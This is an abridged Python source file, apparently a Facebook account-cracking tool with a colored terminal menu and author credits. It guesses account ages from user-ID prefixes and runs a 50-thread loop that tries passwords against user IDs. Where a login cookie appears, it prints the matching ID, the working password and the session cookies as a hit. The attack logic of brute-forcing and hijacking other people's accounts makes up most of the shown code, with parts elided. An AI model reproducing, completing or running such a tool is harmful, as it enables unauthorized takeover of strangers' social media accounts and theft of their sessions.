...
def o():
    ...
    print(" \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××")
    SAMIUL = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m Choice Option \033[38;5;196m: ')
    if SAMIUL == 'A':
        Samiul()
    if SAMIUL == 'B':
    ...
    if SAMIUL == 'C':
        ...
        return None
    if SAMIUL == 'D':
        os.system('xdg-open https://www.github.com/SAMIUL-CYBER-404')
        return None
    if SAMIUL == 'E':
        os.system('exit')
        return None
...
\033[38;5;46m███████ ██   ██ ██      ██ ██  ██████  ███████
 ...
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195mSHAMIUL HAQUE UTSHO   \033[38;5;46m|
 ...
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTEAM         \033[38;5;196m:  \033[38;5;195m6T9-TEAM                   \033[38;5;46m|
 ...
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m My Facebook Account....
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××""")
def linex():
	print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :samiul = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :samiul = ' ~> 2009'
        elif uid[:8] in ['10000000']        :samiul = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:samiul = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:samiul = ' 2010'
        elif uid[:6] in ['100001']          :samiul = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :samiul = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :samiul = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :samiul = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :samiul = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :samiul = ' ~> 2015'
        elif uid[:5] in ['10001']           :samiul = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :samiul = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :samiul = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :samiul = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :samiul = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:samiul = ' ~> 2021'
        elif uid[:5] in ['10008']           :samiul = ' ~>2022'
        elif uid[:5] in ['10009']           :samiul = ' ~> 2023'
        else:hasan=''
...
def samiul():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOOL OWNER \033[1;97m: \033[38;5;45mSAMIUL HAQUE UTSHO')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('    \033[38;5;45m[SAMIUL-OK💉] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[Usar Agent🤖]\033[38;5;195m'+pro+' \033[1;91m ')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\r\r\33[1;31m [SAMIUL-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%sSAMIUL\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
